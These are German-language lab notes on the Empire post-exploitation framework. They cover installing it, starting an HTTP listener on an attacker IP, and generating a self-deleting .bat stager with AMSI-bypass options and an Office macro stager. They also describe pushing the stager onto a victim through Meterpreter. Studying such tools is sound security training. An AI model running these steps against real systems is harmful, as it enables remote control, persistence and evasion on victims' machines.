---
title: Empire Post Exploitation Framework
---

Wird über Meterpreter ins Opfersystem gebracht. 

Bei der Post Exploitation wird versucht, die Privilegien in alle Richtungen auszubauen und Backdoors für einen späteren Zugang einzurichten.

Mit Empire können Makro-Viren erzeugt werden, siehe "Amberg Video 177 Einen Makro-Virus mit Empire erstellen".



# Installieren

Original wird nicht mehr supportet. Fork einer Sicherheitsfirma

Fork: `https://github.com/BC-SECURITY/Empire`

```bash
$ sudo -i
$ pwd
/root
$ git clone https://github.com/BC-SECURITY/Empire
$ ls
Empire

$ cd Empire
$ cd setup
$ ./install.sh
$ cd ..
$ ./empire
```

```
================================================================================
 [Empire]  Post-Exploitation Framework
================================================================================
 [Version] 3.8.2 BC Security Fork | [Web] https://github.com/BC-SECURITY/Empire
================================================================================
 [Starkiller] Multi-User GUI | [Web] https://github.com/BC-SECURITY/Starkiller
================================================================================

   _______ .___  ___. .______    __  .______       _______
  |   ____||   \/   | |   _  \  |  | |   _  \     |   ____|
  |  |__   |  \  /  | |  |_)  | |  | |  |_)  |    |  |__
  |   __|  |  |\/|  | |   ___/  |  | |      /     |   __|
  |  |____ |  |  |  | |  |      |  | |  |\  \----.|  |____
  |_______||__|  |__| | _|      |__| | _| `._____||_______|


       319 modules currently loaded

       0 listeners currently active

       0 agents currently active


(Empire) > 

```

Eventuell ist python-pip zu installieren:

```bash
$ apt update
$ apt install pip
```



# Installieren II

Scheint auch einfacher zu gehen [[Quelle](https://github.com/BC-SECURITY/Empire)]:

### Kali

You can install the latest version of Empire by running the following:

```
sudo apt install powershell-empire
sudo powershell-empire
```



# Empire

Listener, Stager, Agents, Module

## Listener

**Listener**: Binden an Port und auf Verbindungsanforderungen warten

Anzeige der listener und wechsel in den Listener Kontext

```

(Empire) > listeners
[!] No listeners currently active 
(Empire: listeners) > list
[!] No listeners currently active 

(Empire: listeners) > uselistener <TAB><TAB>
dbx             http            http_com        http_foreign    http_hop        http_malleable  http_mapi       meterpreter     onedrive        redirector
(Empire: listeners) > uselistener 


```

```
(Empire: listeners) > uselistener http
(Empire: listeners/http) > info

    Name: HTTP[S]
Category: client_server

Authors:
  @harmj0y

Description:
  Starts a http[s] listener (PowerShell or Python) that uses a
  GET/POST approach.

HTTP[S] Options:

  Name              Required    Value                            Description
  ----              --------    -------                          -----------
  Name              True        http                             Name for the listener.
  Host              True        http://192.168.126.2             Hostname/IP for staging.
  BindIP            True        0.0.0.0                          The IP to bind to on the control server.
  Port              True                                         Port for the listener.
  Launcher          True        powershell -noP -sta -w 1 -enc   Launcher string.
  StagingKey        True        .eXn&^}bVD+jdm<iZa/3#o~SQu_W4{CI Staging key for initial agent negotiation.
  DefaultDelay      True        5                                Agent delay/reach back interval (in seconds).
  DefaultJitter     True        0.0                              Jitter in agent reachback interval (0.0-1.0).
  DefaultLostLimit  True        60                               Number of missed checkins before exiting
  DefaultProfile    True        /admin/get.php,/news.php,/login/ Default communication profile for the agent.
                                process.php|Mozilla/5.0 (Windows
                                NT 6.1; WOW64; Trident/7.0;
                                rv:11.0) like Gecko
  CertPath          False                                        Certificate path for https listeners.
  KillDate          False                                        Date for the listener to exit (MM/dd/yyyy).
  WorkingHours      False                                        Hours for the agent to operate (09:00-17:00).
  Headers           True        Server:Microsoft-IIS/7.5         Headers for the control server.
  Cookie            False       OvaeExENJUopMxa                  Custom Cookie Name
  StagerURI         False                                        URI for the stager. Must use /download/. Example: /download/stager.php
  UserAgent         False       default                          User-agent string to use for the staging request (default, none, or other).
  Proxy             False       default                          Proxy to use for request (default, none, or other).
  ProxyCreds        False       default                          Proxy credentials ([domain\]username:password) to use for request (default, none, or other).
  SlackURL          False                                        Your Slack Incoming Webhook URL to communicate with your Slack instance.
```



```
(Empire: listeners/http) > set Port 80
```

 



```
(Empire: listeners/http) > execute
[*] Starting listener 'http'
 * Serving Flask app "http" (lazy loading)
 * Environment: production
   WARNING: This is a development server. Do not use it in a production deployment.
   Use a production WSGI server instead.
 * Debug mode: off
[+] Listener successfully started!
```



Eine Ebene zurück und Listener anzeigen:

```
(Empire: listeners/http) > back
(Empire: listeners) > list

[*] Active listeners:
                                                                                                                                                                             
  Name              Module          Host                                 Delay/Jitter   KillDate
  ----              ------          ----                                 ------------   --------
  http              http            http://192.168.126.2:80              5/0.0
```



In einer anderen shell kann man das überprüfen:

```bash
$ netstat -tlpn | grep 80
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      12525/python3 
```



## Stager

**Stager**: Software das der Payload auf dem Opfersystem erlaubt eine Verbindung zum Listener auf dem System des Angreifers herzustellen. 

Agent: Nach der Verbindung mit dem Listener wird ein Agent registriert. Agent ist = etablierte Verbindung zum Remote System. D.h. der aktivierte Stager erzeugt einen Agent.

```
(Empire: listeners) > agents
[!] No agents currently registered
(Empire: agents) > usestager 
multi/bash                osx/application           osx/macro                 windows/bunny             windows/launcher_lnk      windows/shellcode
multi/launcher            osx/ducky                 osx/pkg                   windows/csharp_exe        windows/launcher_sct      windows/teensy
multi/macro               osx/dylib                 osx/safari_launcher       windows/dll               windows/launcher_vbs      windows/wmic
multi/pyinstaller         osx/jar                   osx/shellcode             windows/ducky             windows/launcher_xml      
multi/war                 osx/launcher              osx/teensy                windows/hta               windows/macro             
osx/applescript           osx/macho                 windows/backdoorLnkMacro  windows/launcher_bat      windows/macroless_msword  
(Empire: agents) > usestager 

```

Liste mit `usestager`+Leerzeichen+TAB+TAB

```
(Empire: listeners) > agents
[!] No agents currently registered
(Empire: agents) > usestager 
multi/bash                osx/application           osx/macro                 windows/bunny             windows/launcher_lnk      windows/shellcode
multi/launcher            osx/ducky                 osx/pkg                   windows/csharp_exe        windows/launcher_sct      windows/teensy
multi/macro               osx/dylib                 osx/safari_launcher       windows/dll               windows/launcher_vbs      windows/wmic
multi/pyinstaller         osx/jar                   osx/shellcode             windows/ducky             windows/launcher_xml      
multi/war                 osx/launcher              osx/teensy                windows/hta               windows/macro             
osx/applescript           osx/macho                 windows/backdoorLnkMacro  windows/launcher_bat      windows/macroless_msword  
(Empire: agents) > usestager windows/launcher_bat
(Empire: stager/windows/launcher_bat) > 
```

```
(Empire: stager/windows/launcher_bat) > info

Name: BAT Launcher

Description:
  Generates a self-deleting .bat launcher for
  Empire.

Options:

  Name             Required    Value             Description
  ----             --------    -------           -----------
  Listener         True                          Listener to generate stager for.
  Language         True        powershell        Language of the stager to generate.
  StagerRetries    False       0                 Times for the stager to retry
                                                 connecting.
  OutFile          False       /tmp/launcher.bat File to output .bat launcher to,
                                                 otherwise displayed on the screen.
  Delete           False       True              Switch. Delete .bat after running.
  Obfuscate        False       False             Switch. Obfuscate the launcher
                                                 powershell code, uses the
                                                 ObfuscateCommand for obfuscation types.
                                                 For powershell only.
  ObfuscateCommand False       Token\All\1       The Invoke-Obfuscation command to use.
                                                 Only used if Obfuscate switch is True.
                                                 For powershell only.
  UserAgent        False       default           User-agent string to use for the staging
                                                 request (default, none, or other).
  Proxy            False       default           Proxy to use for request (default, none,
                                                 or other).
  ProxyCreds       False       default           Proxy credentials
                                                 ([domain\]username:password) to use for
                                                 request (default, none, or other).
  AMSIBypass       False       True              Include mattifestation's AMSI Bypass in
                                                 the stager code.
  AMSIBypass2      False       False             Include Tal Liberman's AMSI Bypass in
                                                 the stager code.
```

```
(Empire: stager/windows/launcher_bat) > set Listener http
(Empire: stager/windows/launcher_bat) > execute

[*] Stager output written out to: /tmp/launcher.bat
     
```

Stager ist ein Batchdatei die eine Powershell auf dem Zielsystem aufruft und über diesen Weg die Payload ausführt.

Diese Batchdatei muss auf das Opfersystem gebracht werden. Das geht über Metasploit in einer bereits etablierten meterpreter Session.



# Makrovirus erstellen

Mit Empire

```
(Empire) > listeners

[*] Active listeners:

  Name              Module          Host                                 Delay/Jitter   KillDate
  ----              ------          ----                                 ------------   --------
  http              http            http://192.168.126.2:80              5/0.0
```

```
(Empire: listeners) > usestager windows/macro http
(Empire: stager/windows/macro) > info

Name: Macro

Description:
  Generates an office macro for Empire, compatible
  with office 97-2003, and 2007 file types.

```

`http` ist der Name des listeners

```
(Empire: stager/windows/macro) > set OutFile /tmp/macro
(Empire: stager/windows/macro) > execute

[*] Stager output written out to: /tmp/macro

```

Hat nicht funktioniert (27.05.2021)
